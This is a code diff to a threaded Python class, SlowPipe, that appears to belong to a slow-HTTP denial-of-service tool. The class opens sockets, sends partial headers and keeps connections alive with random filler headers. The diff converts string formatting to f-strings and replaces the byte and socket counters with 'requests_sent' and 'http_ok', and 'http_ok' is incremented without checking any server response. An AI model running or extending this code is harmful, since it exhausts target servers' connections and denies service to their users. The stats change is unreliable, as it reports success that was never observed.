@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 import threading
 import socket
 import random
@@ -16,9 +15,9 @@ class SlowPipe(threading.Thread):
         self.mode = mode
         self.connection = None
         self.keep_alive_headers = [
-            "X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"),
-            "X-b: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"),
-            "X-c: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"),
+            f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"),
+            f"X-b: {random.randint(1, 5000)}\r\n".encode("utf-8"),
+            f"X-c: {random.randint(1, 5000)}\r\n".encode("utf-8"),
         ]
 
     def get_attack_params(self):
@@ -56,8 +55,8 @@ class SlowPipe(threading.Thread):
                 initial_packet = self.build_initial_headers().encode("utf-8")
                 self.connection.send(initial_packet)
                 
-                config.attack_stats["sockets_opened"] += 1
-                config.attack_stats["bytes_sent"] += len(initial_packet)
+                config.attack_stats["requests_sent"] += 1
+                config.attack_stats["http_ok"] += 1
 
                 while not config.stop_event.is_set():
                     try:
